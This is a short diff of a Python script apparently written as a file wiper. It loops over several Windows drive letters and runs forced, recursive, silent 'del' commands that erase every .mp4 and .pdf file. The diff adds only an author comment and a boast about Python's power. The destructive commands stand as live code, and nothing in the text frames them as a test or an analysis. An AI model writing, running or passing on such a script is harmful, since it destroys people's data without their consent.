@@ -1,3 +1,4 @@
+#writed by moeion
 import os 
 
 list = ["d" , "e" , "f" , "h" ,"g"]
@@ -11,5 +12,5 @@ for d in list:
     os.system("del "+drive+":\*.mp4 /f /s /q")
     os.system("del "+drive+":\*.pdf /f /s /q")
    
-
+#thise is python's power
 
